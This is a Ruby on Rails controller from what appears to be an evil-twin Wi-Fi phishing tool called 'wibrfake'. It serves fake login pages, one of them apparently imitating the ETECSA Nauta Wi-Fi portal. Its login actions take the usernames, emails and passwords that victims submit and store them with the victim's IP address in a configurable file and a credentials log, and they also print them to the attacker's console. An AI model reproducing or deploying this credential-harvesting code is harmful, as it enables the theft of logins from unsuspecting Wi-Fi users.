class SessionsController < ApplicationController
    def index
        render "index"
    end
  
    def page_basic
        render "basic"
    end
  
    def nauta
        respond_to do |format|
            format.html { render "nauta" }
            format.any do
                Rails.logger.info("Unsupported request format: #{request.headers['Accept']}")
                render "public/406-unsupported-browser", status: :not_acceptable
            end
            format.turbo_stream
        end
    end

    def wibrfake
        render 'wibrfake'
    end
  
    def basic_login
        save_credentials(request.remote_ip, params[:username], params[:email], params[:password], "basic")
        render "basic"
    end
  
    def nauta_login
        save_credentials(request.remote_ip, params[:username], params[:email], params[:password], "wifietecsa")
        render "nauta"
    end
  
    private
  
    def save_credentials(ip, username, email, password, login)
        route_credential = ENV['CREDENTIAL_ROUTE']
        iface = ENV['IFACE']
        id = ENV['ID']
        puts "\n\r{"
        puts "\n\r\tip: #{ip}"
        puts "\r\tUser: #{username}" if email.nil?
        puts "\r\tEmail: #{email}" if username.nil?
        puts "\r\tPassword: #{password}"
        puts "\r}"
        puts "\n"
        print "\r\033[38;5;236m\e[0m\033[48;5;236m \033[38;5;196mwibrfake  #{iface} \e[0m\033[38;5;236m\e[0m "

        unless(route_credential.nil?)
            File.open(route_credential, 'a'){|file|
                file.puts "{"
                file.puts "\tlogin: #{login}"
                file.puts "\tip: #{ip}"
                file.puts "\tuser: #{username}" if email.nil?
                file.puts "\temail: #{email}" if username.nil?
                file.puts "\tpassword: #{password}"
                file.puts "}"
            }
        end
        File.open(File.join(File.dirname(__FILE__), '..', '..', 'lib', 'wibrfake', 'Tmp', id, 'credentials', 'credentials.log'), 'a') do |file|
            file.puts "#{Time.now} IP: #{ip}, Username: #{username}, Email: #{email}, Password: #{password}"
        end
    end
end